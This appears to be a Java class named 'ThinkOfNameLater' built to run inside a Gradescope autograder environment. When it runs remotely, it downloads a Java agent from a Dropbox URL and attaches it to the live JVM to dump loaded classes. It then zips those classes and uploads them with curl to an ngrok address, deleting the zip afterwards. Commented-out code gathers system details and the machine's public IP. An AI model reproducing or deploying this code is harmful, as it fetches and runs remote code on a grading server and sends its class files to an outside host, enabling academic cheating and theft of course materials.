package gradeskope;

import gradeskope.http.CurlFileUploader;
import gradeskope.utils.EmptyClass;
import gradeskope.http.FileUploader;
import gradeskope.utils.MagicManager;
import gradeskope.utils.ZipFolder;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Files;
import java.nio.file.Paths;

public class ThinkOfNameLater {

    private static Integer instantiationCount = 0;

    private boolean enableDump = true;

    private boolean enableAssertTransform = false;

    private boolean enableTestTransform = false;

    private String agentRemoteSrc = "https://dl.dropbox.com/s/zq5ghvatmiq3feq/GradescopeAgent-1.0-SNAPSHOT.jar?dl=0";

    private String agentLocalSrc = "/home/user/IdeaProjects/GradescopeInspector2/GradescopeAgent/build/libs/GradescopeAgent-1.1.jar";

    private String dumpDest = "https://f0e9-152-2-31-194.ngrok-free.app/upload";

    private String zipName = "ClassesA07.zip";

    public ThinkOfNameLater() {

    }

    public ThinkOfNameLater(boolean enableDump, boolean enableAssertTransform, boolean enableTestTransform) {
        this.enableDump = enableDump;
        this.enableAssertTransform = enableAssertTransform;
        this.enableTestTransform = enableTestTransform;
    }

    public void run() {

        instantiationCount++;

        //      To only run this code once
        if (instantiationCount == 1) {

            // Get System Information


            // Run System Commands (Currently Broken)
//            String[] checkInstalledPackagesCommand = {"pacman", "-Q"};
//            String[] checkInstalledPackagesCommand = {"yum", "list", "installed"};
//            RunCommand command = new RunCommand(checkInstalledPackagesCommand);
//            command.execute();


            // Get IPv4 Address

//            String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0";
//            String GET_URL = "https://icanhazip.com";
//            SimpleHttpURLConnection simpleHttpURLConnection = new SimpleHttpURLConnection(USER_AGENT, GET_URL);
//
//            String ipAddress = "";
//            try {
//                ipAddress = simpleHttpURLConnection.sendGET();
//            } catch (IOException e) {
//                e.printStackTrace();
//            }


            // Get path to tools.jar
//            AtomicReference<String> toolsJARPath = new AtomicReference<>("");
//            try (Stream<Path> walkStream = Files.walk(Paths.get("/usr/lib/jvm"))) {
//                walkStream.filter(p -> p.toFile().isFile()).forEach(f -> {
//                    if (f.toString().endsWith("tools.jar")) {
//                        toolsJARPath.set(toolsJARPath + f.toString() + "\n");
//                    }
//                });
//            } catch (IOException e) {
//                throw new RuntimeException(e);
//            }

            String tmpdir = "/tmp/javaroot/";

            // Temporary directory for download and class exporting
            if (MagicManager.isRemote()) {


                File downloadDir = new File(tmpdir);
                try {
                    Files.createDirectories(downloadDir.toPath());

                    if (Files.isWritable(downloadDir.toPath())) {
                        // Download Java Agent and save to tmpdir
                        URL website = null;
                        website = new URL(agentRemoteSrc);
                        ReadableByteChannel rbc = Channels.newChannel(website.openStream());
                        FileOutputStream fos =
                            new FileOutputStream(tmpdir + "TestJavaAgent_1_0_SNAPSHOT.jar");
                        fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
                    }
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }

            String agentArgs = "";

            if (enableDump) {
                agentArgs = agentArgs + "--enableDumpingTransform ";
            }

            if (enableAssertTransform) {
                agentArgs = agentArgs + "--enableAssertTransform ";
            }

            if (enableTestTransform) {
                agentArgs = agentArgs + "--enableTestTransform ";
            }

            if (MagicManager.isRemote()) {
//                throw new RuntimeException(
//                        String.format("This is a test. This class has been instantiated %d %s.\n", instantiationCount, instantiationCount == 1 ? "time" : "times")
//                                + "System Info: " + MagicManager.getJavaInfo() + " " + MagicManager.getOsInfo() + "\n"
//                    + "Public IPv4 Address: " + ipAddress + "\n"
//                    + "Tools.jar Locations: " + "\n" + toolsJARPath + "\n"
//                      + base64ClassesEncoding
//                );

                MagicManager.attachGivenAgentToThisVM(tmpdir + "TestJavaAgent_1_0_SNAPSHOT.jar", agentArgs);
            } else {
                MagicManager.attachGivenAgentToThisVM(agentLocalSrc, agentArgs);
            }
//            if (Main.instantiationCount == 1) {
//                throw new RuntimeException(
//                        String.format("This is a test. This class has been instantiated %d %s.\n", Main.instantiationCount, Main.instantiationCount == 1 ? "time" : "times")
//                );
//            }

//


            // Get class bytecode, turn it into a base64 string, then print it
            // No longer needed because dumping to base64 is dumb (if funny) and I'm going to dump it all to files, zip, then send
//            Class agentClass = null;
//            ArrayList<byte[]> classByteCodes = null;
//            try {
//                agentClass = Class.forName("org.example.TestJavaAgent");
//                classByteCodes = (ArrayList<byte[]>) agentClass.getField("classByteCodes").get(null);
//            } catch (ClassNotFoundException | NoSuchFieldException | IllegalAccessException e) {
//                throw new RuntimeException(e);
//            }
//
//            String base64ClassesEncoding = "";
//            for (byte[] classByteCode : classByteCodes) {
//                base64ClassesEncoding = base64ClassesEncoding + Base64.getEncoder().encodeToString(classByteCode) + "\n\n";
//            }

            if (enableDump) {
                ZipFolder zipFolder = new ZipFolder();
                File[] excludedFiles = {new File(tmpdir + zipName)};

                try {
                    zipFolder.zipFolder(
                            new File(tmpdir),
                            new File(tmpdir + zipName),
                            excludedFiles
                    );
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }

                String[] headers = {"ngrok-skip-browser-warning: true"};
                FileUploader fileUploader = new CurlFileUploader(dumpDest, headers, new File(tmpdir + zipName));

                // Delete zip after upload
                try {
                    Files.deleteIfExists(Paths.get(tmpdir + zipName));
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            // Upload Zip Files to quick and dirty http upload server
        }
    }
}
